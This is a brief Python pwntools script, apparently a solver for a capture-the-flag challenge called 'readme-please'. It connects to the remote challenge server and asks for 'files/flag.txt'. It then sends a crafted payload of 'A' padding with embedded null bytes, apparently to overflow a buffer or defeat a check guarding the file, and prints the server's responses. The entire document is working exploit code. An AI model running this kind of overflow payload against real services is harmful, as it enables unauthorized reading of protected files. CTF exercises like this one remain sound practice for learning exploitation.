from pwn import *

elf = context.binary = ELF("./main")
p = remote("readme-please.ctf.pearlctf.in", 30039)

# Send the filename first
p.sendline(b"files/flag.txt")

# Read payload from file
payload = b"\x41" * 14 + b"\x00" + b"\x41" * 111 + b"\x00"
write("payload",payload)
# Send the payload
p.sendline(payload)

# Receive and print the output
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
